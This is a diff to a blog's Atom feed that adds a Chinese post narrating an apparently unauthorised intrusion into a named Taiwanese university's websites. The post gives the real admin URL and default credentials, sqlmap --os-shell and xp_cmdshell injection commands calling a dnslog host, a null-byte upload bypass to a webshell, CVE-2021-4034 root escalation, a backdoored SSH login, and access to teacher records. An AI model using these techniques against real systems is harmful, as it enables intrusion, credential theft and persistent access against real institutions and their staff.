@@ -6,7 +6,7 @@
   <link href="https://blog.abins.top/atom.xml" rel="self"/>
   
   <link href="https://blog.abins.top/"/>
-  <updated>2022-02-22T06:45:01.197Z</updated>
+  <updated>2022-06-13T07:53:18.593Z</updated>
   <id>https://blog.abins.top/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>台湾某大学sql/渗透</title>
+    <link href="https://blog.abins.top/2022/06/13/%E5%8F%B0%E6%B9%BE%E6%9F%90%E5%A4%A7%E5%AD%A6sql%E6%B8%97%E9%80%8F/"/>
+    <id>https://blog.abins.top/2022/06/13/%E5%8F%B0%E6%B9%BE%E6%9F%90%E5%A4%A7%E5%AD%A6sql%E6%B8%97%E9%80%8F/</id>
+    <published>2022-06-13T07:48:37.000Z</published>
+    <updated>2022-06-13T07:53:18.593Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="台湾某大学sql-渗透"><a href="#台湾某大学sql-渗透" class="headerlink" title="台湾某大学sql/渗透"></a>台湾某大学sql/渗透</h1><p>就是说很久没更新博客了，之前打的一个站拿来记录一下，没有很精彩的渗透过程，没有华丽的操作，这学校也没有内网，所以也就没有摸下去了，差不多就是拿个shell这样</p><h2 id="外网SQL注入getsehll"><a href="#外网SQL注入getsehll" class="headerlink" title="外网SQL注入getsehll"></a>外网SQL注入getsehll</h2><p><a href="https://www.ccut.edu.tw/adminSection/lecture/admin/default.asp">https://www.ccut.edu.tw/adminSection/lecture/admin/default.asp</a> </p><p>主站后台管理地址</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613152503.png" alt="image-20220613152503338"></p><p>admin/admin</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613152532.png" alt="image-20220613152532833"></p><p>上传图片接口估计关了</p><p>谷歌语法找到一处注入点 <a href="https://xxxx/adminsection/front/newshow.asp?row_id=23254&amp;site_id=rd_iic">https://xxxx/adminsection/front/newshow.asp?row_id=23254&amp;site_id=rd_iic</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613152613.png" alt="image-20220613152613375"></p><p>直接sqlmap一把唆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;https:&#x2F;&#x2F;xxxx&#x2F;adminsection&#x2F;front&#x2F;newshow.asp?row_id&#x3D;23254&amp;site_id&#x3D;rd_iic&quot; -batch --os-shell</span><br></pre></td></tr></table></figure><p>延时堆叠注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220303164416.png"></p><p>验证能否命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxxx&#x2F;adminsection&#x2F;front&#x2F;newshow.asp?row_id&#x3D;23254&amp;site_id&#x3D;rd_iic&#39;;exec master..xp_cmdshell &#39;ping higam6.dnslog.cn&#39;--</span><br></pre></td></tr></table></figure><p>dns有回显（这里用这个方式是因为我sqlmap跑不出来。。）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613152903.png" alt="img"></p><p>osshell，使用powershell上线</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220303164441.png"></p><p>上线cs 忘记截图了，就简单的摸了下文件，找到f盘，得到两台机器ftp密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613153027.png" alt="image-20220613153027307"></p><h2 id="文件上传Getshell"><a href="#文件上传Getshell" class="headerlink" title="文件上传Getshell"></a>文件上传Getshell</h2><p>信息收集到另一个子域名</p><p><a href="http://xxxx/lms/Personal_Page/index.php">http://xxxx/lms/Personal_Page/index.php</a> </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613153148.png" alt="image-20220613153148453"></p><p>弱口令登入 1/1 2/2 3/3</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613153222.png" alt="image-20220613153222250"></p><p>个人资料处可以上传头像，</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220304154657.png"></p><p>上传的路径很奇怪是路径+？的，但是最后fuzz到了真实路径，</p><p><a href="http://xxxx/lms/Personal_File/17702/">http://xxxx/lms/Personal_File/17702/</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613153505.png" alt="image-20220613153505780"></p><p>通过fuzz，发现使用00截断的方法上传后，文件后缀有些许变化</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220321143617.png"></p><p>我首先上传了一个后缀为php%00.jpg的文件，发现变成了php%00，猜测是根据点号来判断白名单的，如果在%00前加一个点号那么点号后面会被省略，造成php的上传</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220321143909.png"></p><p>如上图格式，进行放包，</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613153913.png" alt="image-20220613153913103"></p><p>冰蝎连接成功</p><h3 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h3><p>翻了一下文件夹翻到两个数据库账号密码，连接不上</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613153952.png" alt="image-20220613153952782"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用<strong>CVE-2021-4034</strong>的exp提权，下载好之后make一下</p><p>反弹到自己服务器上后执行exp并不成功，卡了很久，一开始以为exp的问题</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220321163753.png"></p><p>最后在冰蝎终端里配了个环境变量成功了。。。（问题应该是刚刚不是交互式的原因，冰蝎自带终端是交互式的s）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220321163844.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>简单设置个软链接后门维持下权限</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220321174950.png"></p><p>密码为root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@xxxx -p 666</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613154237.png" alt="image-20220613154237449"></p><p>结束了，没内网环境</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>又一个子域</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613154344.png" alt="image-20220613154344615"></p><p>但是可能是对方服务器版本太低了，不能直接osshell，dba权限是有的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220303213118.png"></p><p>别的大师傅的电脑上OK</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220304154426.png"></p><p>也没有内网环境</p><h2 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h2><p>子域很多，想再拿下几台的，重新收集下了资产后找到了这个系统，找到了登陆口</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613092109.png" alt="image-20220613092101700"></p><p>心想这个站那么多子域那么多sql，这个估计也有，反手敲个sql万能密码然后进去了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613092248.png" alt="image-20220613092247750"></p><p>管理员权限，里面一些教师信息</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613092651.png" alt="image-20220613092651094"></p><p>连续找了几个注入点都不太行，最终找到一个可行的，sqlmap跑会重置，应该有防护，通过手注出来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ta&#x2F;hctest&#x2F;index.php?do&#x3D;test&amp;cid&#x3D;175</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613143606.png" alt="image-20220613143606450"></p><p>同样也是没有内网的一台机器</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20220613150554.png" alt="image-20220613150554127"></p><p>想写的时候再写吧，感觉还可以打</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;台湾某大学sql-渗透&quot;&gt;&lt;a href=&quot;#台湾某大学sql-渗透&quot; class=&quot;headerlink&quot; title=&quot;台湾某大学sql/渗透&quot;&gt;&lt;/a&gt;台湾某大学sql/渗透&lt;/h1&gt;&lt;p&gt;就是说很久没更新博客了，之前打的一个站拿来记录一下，没有很精彩的渗透</summary>
+      
+    
+    
+    
+    <category term="-渗透" scheme="https://blog.abins.top/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Port knockd服务</title>
